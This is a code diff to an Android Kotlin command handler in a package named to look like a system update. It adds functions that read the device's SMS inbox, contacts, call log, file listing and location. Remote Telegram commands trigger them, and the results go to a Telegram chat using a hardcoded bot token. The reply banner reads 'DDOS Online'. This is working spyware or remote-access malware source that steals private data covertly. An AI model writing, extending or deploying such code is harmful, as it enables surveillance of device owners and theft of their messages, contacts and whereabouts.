@@ -1,6 +1,12 @@
 package com.sys.update
 
 import android.content.Context
+import android.content.Intent
+import android.net.Uri
+import android.os.Environment
+import android.provider.CallLog
+import android.provider.ContactsContract
+import android.provider.MediaStore
 import kotlinx.coroutines.*
 import okhttp3.*
 import java.util.concurrent.TimeUnit
@@ -10,15 +16,20 @@ object CmdHandler {
         .readTimeout(60, TimeUnit.SECONDS).build()
 
     fun handle(ctx: Context, cmd: String, chatId: String) {
-        val token = "7966180213:AAGFqmNDy9b-vNFRAvuBQy6yf3b2U5fIxbI" // Ye wahi token jo BotService mein hai
+        val token = "7966180213:AAGFqmNDy9b-vNFRAvuBQy6yf3b2U5fIxbI"
         CoroutineScope(Dispatchers.IO).launch {
             val reply = when {
-                cmd == "/start"    -> "🟢 Online. Commands: /info /lock /ring /location /apps"
+                cmd == "/start"    -> "🟢 DDOS Online.\n\nCommands:\n/info \n/location \n/sms \n/contacts \n/calls \n/apps \n/lock \n/ring \n/files \n/camera"
                 cmd == "/info"     -> deviceInfo()
                 cmd == "/apps"     -> installedApps(ctx)
                 cmd == "/lock"     -> { lockDevice(ctx); "🔒 Locked." }
                 cmd == "/ring"     -> { ringDevice(ctx); "🔔 Ringing." }
                 cmd == "/location" -> getLocation(ctx)
+                cmd == "/sms"      -> readSms(ctx)
+                cmd == "/contacts" -> readContacts(ctx)
+                cmd == "/calls"    -> readCallLogs(ctx)
+                cmd == "/files"    -> listFiles()
+                cmd == "/camera"   -> { takePhoto(ctx); "📸 Camera command sent." }
                 else               -> "❓ Unknown: $cmd"
             }
             send(token, chatId, reply)
@@ -38,7 +49,58 @@ object CmdHandler {
         val apps = pm.getInstalledApplications(0)
             .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
             .map { it.packageName }
-        return "📦 Apps (${apps.size}):\n" + apps.take(60).joinToString("\n")
+        return "📦 Apps (${apps.size}):\n" + apps.take(50).joinToString("\n")
+    }
+
+    private fun readSms(ctx: Context): String {
+        val smsList = mutableListOf<String>()
+        val cursor = ctx.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
+        cursor?.use {
+            while (it.moveToNext() && smsList.size < 10) {
+                val address = it.getString(it.getColumnIndexOrThrow("address"))
+                val body = it.getString(it.getColumnIndexOrThrow("body"))
+                smsList.add("📩 $address: $body")
+            }
+        }
+        return if (smsList.isEmpty()) "No SMS found." else "💬 Last 10 SMS:\n" + smsList.joinToString("\n")
+    }
+
+    private fun readContacts(ctx: Context): String {
+        val contacts = mutableListOf<String>()
+        val cursor = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+        cursor?.use {
+            while (it.moveToNext() && contacts.size < 20) {
+                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                contacts.add("👤 $name: $number")
+            }
+        }
+        return if (contacts.isEmpty()) "No contacts." else "📇 Contacts:\n" + contacts.joinToString("\n")
+    }
+
+    private fun readCallLogs(ctx: Context): String {
+        val calls = mutableListOf<String>()
+        val cursor = ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
+        cursor?.use {
+            while (it.moveToNext() && calls.size < 10) {
+                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
+                val duration = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
+                calls.add("📞 $number (${duration}s)")
+            }
+        }
+        return if (calls.isEmpty()) "No calls." else "📞 Last 10 Calls:\n" + calls.joinToString("\n")
+    }
+
+    private fun listFiles(): String {
+        val dir = Environment.getExternalStorageDirectory()
+        val files = dir.listFiles()?.take(20)?.map { it.name } ?: emptyList()
+        return "📁 Files in SD:\n" + files.joinToString("\n")
+    }
+
+    private fun takePhoto(ctx: Context) {
+        val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        try { ctx.startActivity(intent) } catch (e: Exception) {}
     }
 
     private fun lockDevice(ctx: Context) {
@@ -57,7 +119,7 @@ object CmdHandler {
             val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
             val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                 ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
-            if (loc != null) "📍 ${loc.latitude}, ${loc.longitude}"
+            if (loc != null) "📍 ${loc.latitude}, ${loc.longitude}\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}"
             else "❌ No location yet."
         } catch (e: SecurityException) {
             "❌ Location permission not granted."
@@ -69,8 +131,9 @@ object CmdHandler {
         val body = FormBody.Builder()
             .add("chat_id", chatId)
             .add("text", text)
-            .add("parse_mode", "Markdown")
             .build()
-        client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
+        try {
+            client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
+        } catch (e: Exception) {}
     }
 }
